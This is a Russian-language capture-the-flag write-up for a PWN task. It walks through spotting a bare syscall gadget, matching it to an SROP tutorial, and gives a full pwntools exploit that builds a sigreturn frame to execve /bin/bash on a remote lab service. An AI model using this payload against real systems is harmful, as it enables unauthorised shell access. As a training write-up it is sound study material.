# Решение PWN-2 (20)
1. Откроем файл task и увидим в функции main() следующее содержимое:
```

void entry(void)

{
  syscall();
  return;
}

```
2. Видим syscall и понимаем, что нам нужен SROP для решения.
3. В самом конце файла записана строка `/bin/bash` которая и должна быть передана в качестве аргумента для `syscall`
4. Находим подходящую статью по SROP в учебнике по PWN - [вот ссылка](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop)
5. Пример в статье очень напоминает нам наш файл.
 Вот как это выглядит в статье:
 ```
 from pwn import *

  context.arch = 'amd64'
  context.os = 'linux'
  
  elf = ELF.from_assembly(
      '''
          mov rdi, 0;
          mov rsi, rsp;
          sub rsi, 8;
          mov rdx, 500;
          syscall;
          ret;
          
          pop rax;
          ret;
      ''', vma=0x41000
  )
  elf.save('vuln')
  ```
 И вот как у нас:
 ```
 00041000 48 c7 c7        MOV        RDI,0x0
       00 00 00 00
 00041007 48 89 e6        MOV        RSI,RSP
 0004100a 48 83 ee 08     SUB        RSI,0x8
 0004100e 48 c7 c2        MOV        RDX,0x1f4
       f4 01 00 00
 00041015 0f 05           SYSCALL
 00041017 c3              RET
 00041018 58              POP        RAX
 00041019 c3              RET
   ```
6. Пишем эксплойт по гайду и получаем такой код:
```
from pwn import *

elf = context.binary = ELF('./task', checksec=False)
p = remote('192.168.12.13', 1555)

BINSH = elf.address + 0x1430
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b  
frame.rdi = BINSH          
frame.rsi = 0x0          
frame.rdx = 0x0           
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
7. Профит
![flag](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/pwn2/proofpwn2.png)
